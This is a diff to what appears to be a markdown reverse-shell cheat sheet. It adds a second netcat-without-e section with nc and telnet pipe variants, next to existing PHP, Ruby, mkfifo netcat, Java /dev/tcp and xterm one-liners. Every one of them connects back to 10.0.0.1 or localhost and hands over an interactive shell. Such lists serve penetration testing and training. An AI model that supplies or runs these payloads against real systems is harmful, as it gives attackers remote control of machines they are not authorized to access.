@@ -130,15 +130,22 @@ php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ```
 
-##### Netcat without -e
+##### Netcat without -e #1
 ```bash
 rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 > /tmp/f
+```
+
+##### Netcat without -e #2
+```bash
+nc localhost 443 | /bin/sh | nc localhost 444
+telnet localhost 443 | /bin/sh | telnet localhost 444```
 ```
 
 ##### Java
 ```bash
 r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor();
 ```
+
 ##### XTerm
 ```bash
 xterm -display 10.0.0.1:1
